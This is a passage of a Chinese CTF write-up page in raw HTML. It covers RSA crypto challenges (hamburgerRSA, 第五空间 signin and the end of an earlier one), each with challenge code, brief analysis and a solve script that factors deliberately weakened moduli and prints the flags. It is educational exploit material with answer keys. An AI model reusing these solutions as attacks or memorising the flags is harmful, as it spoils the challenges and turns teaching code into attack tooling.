class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>h</mi></msub><mtext>和</mtext><msub><mi>p</mi><mi>l</mi></msub><mtext>都是</mtext><mn>200</mn><mtext>位的</mtext><mo separator="true">,</mo><mtext>所以</mtext><mi>n</mi><mtext>第一项大约</mtext><mn>800</mn><mtext>位</mtext></mrow><annotation encoding="application/x-tex">p_h和p_l都是200位的,所以n第一项大约800位</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">的</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">约</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">位</span></span></span></span></p><p>可以得：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><msub><mi>p</mi><mi>l</mi></msub><msub><mo stretchy="false">)</mo><mi>h</mi></msub><mo>=</mo><mfrac><mi>n</mi><mrow><mn>1</mn><msup><mn>0</mn><mn>600</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><msub><mi>p</mi><mi>l</mi></msub><msub><mo stretchy="false">)</mo><mi>l</mi></msub><mo>=</mo><mi>n</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p_h*p_l)_h=\frac{n}{10^{600}} \\(p_h*p_l)_l=n\quad mod(10^{200})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>这样我们就有了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><msub><mi>p</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">p_h*p_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的高200位和低200位</p><p>也就得到了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><msub><mi>p</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">p_h*p_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>结合n的表达式，我们就可以求解二元方程组了</p><h2 id="exp-12"><a class="markdownIt-Anchor" href="#exp-12"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-number">182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span><br>n = <span class="hljs-number">438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><br>e = <span class="hljs-number">0x10001</span><br><br>pqh = n // <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">600</span>)<br>pql = n % <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>)<br>pq = pqh*<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>) + pql<br><br>n -= <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">400</span>)*pq + pq<br><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>h=Int(<span class="hljs-string">&#x27;h&#x27;</span>)<br>l=Int(<span class="hljs-string">&#x27;l&#x27;</span>)<br>s=Solver()<br>s.add(h*l==pq)<br>s.add(<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>)*h*h+<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>)*l*l==n)<br>s.check()<br>s=s.model()<br>h=s[s.decls()[<span class="hljs-number">0</span>]].as_long()<br>l=s[s.decls()[<span class="hljs-number">1</span>]].as_long()<br>p = h*<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>) + l<br>q = l*<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>) + h<br><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(long_to_bytes(powmod(c, d, p*q)))<br><span class="hljs-comment">#b&#x27;CMISCCTF&#123;easy_math_game_hhhhhhh&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;easy_math_game_hhhhhhh&#125;</span><br></code></pre></td></tr></table></figure><h1 id="mtctf-2021hamburgerrsa"><a class="markdownIt-Anchor" href="#mtctf-2021hamburgerrsa"></a> [MTCTF 2021]hamburgerRSA</h1><h2 id="题目-13"><a class="markdownIt-Anchor" href="#题目-13"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read()<br>nbit = <span class="hljs-number">64</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p, q = getPrime(nbit), getPrime(nbit)<br>    PP = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q))<br>    QQ = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p))<br>    <span class="hljs-keyword">if</span> isPrime(PP) <span class="hljs-keyword">and</span> isPrime(QQ):<br>        <span class="hljs-keyword">break</span><br><br>n = PP * QQ<br>m = bytes_to_long(flag.encode())<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">65537</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-comment">#n = 177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span><br><span class="hljs-comment">#c = 47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span><br></code></pre></td></tr></table></figure><h2 id="分析-13"><a class="markdownIt-Anchor" href="#分析-13"></a> 分析</h2><p>原理同上题</p><p>64位的十进制大约19-20位</p><p>p*q大约38位？</p><p>（但是我还是不咋理解</p><h2 id="exp-13"><a class="markdownIt-Anchor" href="#exp-13"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits<br><span class="hljs-keyword">from</span> factordb.factordb <span class="hljs-keyword">import</span> FactorDB<br>n = <span class="hljs-number">177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span><br>c = <span class="hljs-number">47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span><br>e = <span class="hljs-number">65537</span><br><br>pqh = <span class="hljs-built_in">str</span>(n)[:<span class="hljs-number">19</span>]<br>pql = <span class="hljs-built_in">str</span>(n)[-<span class="hljs-number">18</span>:]<br><br><span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> product(digits, repeat=<span class="hljs-number">2</span>):<br>    pq = pqh + i + j + pql<br>    tp = FactorDB(<span class="hljs-built_in">int</span>(pq))<br>    tp.connect()<br>    tp=tp.get_factor_list()<br>    <span class="hljs-keyword">if</span> tp <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(tp) == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> tp[<span class="hljs-number">0</span>].bit_length() == <span class="hljs-number">64</span>:<br>        p, q = tp<br>        <span class="hljs-keyword">break</span><br>PP = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q))<br>QQ = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p))<br><br>d = invert(<span class="hljs-number">0x10001</span>, (PP-<span class="hljs-number">1</span>)*(QQ-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(powmod(c, d, n)))<br><span class="hljs-comment">#b&#x27;flag&#123;f8d8bfa5-6c7f-14cb-908b-abc1e96946c6&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;f8d8bfa5-6c7f-14cb-908b-abc1e96946c6&#125;</span><br></code></pre></td></tr></table></figure><h1 id="第五空间-2021signin"><a class="markdownIt-Anchor" href="#第五空间-2021signin"></a> [第五空间 2021]signin</h1><h2 id="题目-14"><a class="markdownIt-Anchor" href="#题目-14"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">0x10001</span><br>x = (p ^ q) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">400</span>) - <span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span> + <span class="hljs-built_in">str</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = &quot;</span> + <span class="hljs-built_in">str</span>(e))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span> + <span class="hljs-built_in">str</span>(n))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = &quot;</span> + <span class="hljs-built_in">str</span>(x))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 86415476382906786465939442398992406348852252355326334785583474583480585659663836032856765037225261433532613020730103955916772373674295180495452293421279237222544308971840820110279355118064931506637793547489441433938707518241461449059717326341918746156620038847745542794560335988858156929013492541794032580255</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">n = 166337085427556441543394334802135957169988266794453522153008810336368247289697353242192853337017363111987395194428553050681210209730724596529629525357502302165396675392000087988956194589350195512264427901330860811469484473725396354231555692283910488095918243519370430703255279433498479943391876108577325840381</span><br><span class="hljs-string">x = 2509898544460604898497702985357222191225421344430742181152035006910161802193623236888758239071502008180363546424715261788</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="分析-14"><a class="markdownIt-Anchor" href="#分析-14"></a> 分析</h2><p>进阶版的p异或q</p><p>只给了p和q的低400位</p><p>利用dfs剪枝计算可能的p和q</p><p>然后coppersmith计算p和q</p><p>(具体原理我也说不清，可以当作板子题把，直接拿xenny师傅的wp了)</p><p>(注意点，sage环境中异或是^^)</p><h2 id="exp-14"><a class="markdownIt-Anchor" href="#exp-14"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-number">86415476382906786465939442398992406348852252355326334785583474583480585659663836032856765037225261433532613020730103955916772373674295180495452293421279237222544308971840820110279355118064931506637793547489441433938707518241461449059717326341918746156620038847745542794560335988858156929013492541794032580255</span><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">166337085427556441543394334802135957169988266794453522153008810336368247289697353242192853337017363111987395194428553050681210209730724596529629525357502302165396675392000087988956194589350195512264427901330860811469484473725396354231555692283910488095918243519370430703255279433498479943391876108577325840381</span><br>x = <span class="hljs-number">2509898544460604898497702985357222191225421344430742181152035006910161802193623236888758239071502008180363546424715261788</span><br><br>plist = [<span class="hljs-number">0</span>]<br>qlist = [<span class="hljs-number">0</span>]<br><br>mask = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>    tmpp, tmpq = [],[]<br>    <span class="hljs-keyword">for</span> p,q <span class="hljs-keyword">in</span> [(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)]:<br>        <span class="hljs-keyword">if</span> p^^q == ((x&gt;&gt;mask)&amp;<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plist)):<br>                <span class="hljs-keyword">if</span> ((p&lt;&lt;mask) + plist[j]) * ((q&lt;&lt;mask) + qlist[j]) % (<span class="hljs-number">2</span>&lt;&lt;mask) == n % (<span class="hljs-number">2</span>&lt;&lt;mask):<br>                    tmpp.append((p&lt;&lt;mask) + plist[j])<br>                    tmpq.append((q&lt;&lt;mask) + qlist[j])<br>    plist,qlist = tmpp, tmpq<br>    mask += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> pbar <span class="hljs-keyword">in</span> plist:<br>    PR = PolynomialRing(Zmod(n), <span class="hljs-string">&#x27;x&#x27;</span>)<br>    x = PR(<span class="hljs-string">&#x27;x&#x27;</span>)<br>    ZmodN = Zmod(n)<br>    f = x*ZmodN(<span class="hljs-number">2</span>**<span class="hljs-number">400</span>) + pbar<br>    f = f.monic()<br>    r = f.small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">112</span>, beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> r:<br>        p = <span class="hljs-built_in">int</span>(pbar+r[<span class="hljs-number">0</span>]* <span class="hljs-number">2</span>**<span class="hljs-number">400</span>)<br>        <span class="hljs-keyword">if</span> n%p == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br><br>q = n // p<br>d = inverse_mod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(power_mod(c, d, n)))<br><span class="hljs-comment">#b&#x27;flag&#123;59sm5gzl-8wbm-v2lj-w7m2-4op2lyr8wjz8&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;59sm5gzl-8wbm-v2lj-w7m2-4op2lyr8wjz8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ciscn-2021初赛rsa"><a class="markdownIt-Anchor" href="#ciscn-2021初赛rsa"></a> [CISCN 2021初赛]rsa</h1><h2 id="题目-15"><a class="markdownIt-Anchor" 